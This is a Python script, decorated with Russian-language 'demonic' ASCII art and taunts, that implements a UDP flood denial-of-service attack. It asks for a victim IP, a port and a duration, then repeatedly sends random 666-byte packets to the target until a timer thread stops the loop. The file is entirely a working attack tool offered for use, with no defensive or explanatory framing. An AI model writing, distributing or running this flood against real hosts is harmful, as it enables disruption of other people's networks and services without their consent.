import socket
import random
import time
import threading
from colorama import Fore, Style, init
init()

# ========== DEMONIC BLOOD-SOAKED ASCII ART ========== #
DEMON_PORTAL = f"""
            ▄︻̷̿┻̿═━一  {Fore.WHITE}БОГ ХАОСА ПРИШЕЛ {Fore.RED} 一═┻̿┷̿︻▄
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   {Fore.WHITE}УБЕЙ{Fore.RED}   `98v8P'   {Fore.WHITE}УМРИ{Fore.RED}  `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
{Style.RESET_ALL}
"""

# Global attack control
ATTACK_ACTIVE = True

# ========== DEMONIC FUNCTIONS ========== #
def print_demonic(text):
    for char in text:
        print(f"{Fore.RED}{char}{Style.RESET_ALL}", end='', flush=True)
        time.sleep(0.1)
    print()

def scream():
    print(f"{Fore.WHITE}{Style.BRIGHT}АААААРГХ! {Fore.RED}☠ ЧЕРТ ВОЗЬМИ! ☠{Style.RESET_ALL}")

def blood_drip():
    print(f"{Fore.RED}✟ КРОВЬ КАПАЕТ... ✟{Style.RESET_ALL}")

def russian_hex():
    hexes = [
        "ТВОЯ ДУША ПРИНАДЛЕЖИТ АДУ",
        "СИСТЕМА УМРЕТ В МУКАХ",
        "КИБЕРДЕМОНЫ ИДУТ",
        "ПОРТЫ ГОРЯТ В АДСКОМ ПЛАМЕНИ"
    ]
    return random.choice(hexes)

# ========== ATTACK TIMER FUNCTION ========== #
def attack_timer(duration):
    global ATTACK_ACTIVE
    time.sleep(duration)
    ATTACK_ACTIVE = False
    print(f"\n{Fore.RED}⚡ АТАКА ЗАВЕРШЕНА ПОСЛЕ {duration} СЕКУНД АДА ⚡{Style.RESET_ALL}")

# ========== ULTIMATE DDOS ATTACK ========== #
def nightmare_ddos():
    global ATTACK_ACTIVE
    
    print(DEMON_PORTAL)
    print_demonic("☠ АКТИВИРОВАН РЕЖИМ КОШМАРА ☠")
    print_demonic("ПОДКЛЮЧЕНИЕ К ТЕНЕВОЙ ПАУТИНЕ...")
    time.sleep(1)
    scream()
    blood_drip()
    
    ip = input(f"{Fore.RED}ВВЕДИТЕ IP ЖЕРТВЫ: {Style.RESET_ALL}")
    port = int(input(f"{Fore.RED}ВВЕДИТЕ ПОРТ ДЛЯ РАЗРУШЕНИЯ: {Style.RESET_ALL}"))
    duration = int(input(f"{Fore.RED}ВВЕДИТЕ ДЛИТЕЛЬНОСТЬ АТАКИ (СЕКУНДЫ): {Style.RESET_ALL}"))
    
    # Start the timer thread
    timer_thread = threading.Thread(target=attack_timer, args=(duration,))
    timer_thread.daemon = True
    timer_thread.start()
    
    print_demonic(f"{Fore.WHITE}☠ НАЧИНАЮ АТАКУ НА {ip}:{port} ☠")
    print_demonic(f"{Fore.RED}⚡ {russian_hex()} ⚡")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(666)  # DEMONIC PACKET SIZE
    
    sent = 0
    start_time = time.time()
    
    try:
        while ATTACK_ACTIVE:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            elapsed = time.time() - start_time
            print(f"{Fore.RED}[ДЕМОН-{sent}] {Fore.WHITE}Отправлено {sent} проклятых пакетов за {elapsed:.1f}s {Fore.RED}⚡")
            
            if sent % 10 == 0:
                scream()
                blood_drip()
            
            time.sleep(0.01)
            
    except KeyboardInterrupt:
        print_demonic("АТАКА ОСТАНОВЛЕНА... НО АД ЖДЕТ...")
    except Exception as e:
        print_demonic(f"ДЕМОН ОШИБСЯ: {e}")
    finally:
        sock.close()
        print_demonic(f"{Fore.RED}☠ ОБЩАЯ СИЛА АТАКИ: {sent} ПАКЕТОВ ЗА {time.time()-start_time:.1f} СЕКУНД ☠")

# ========== MAIN EXECUTION ========== #
if __name__ == "__main__":
    nightmare_ddos()
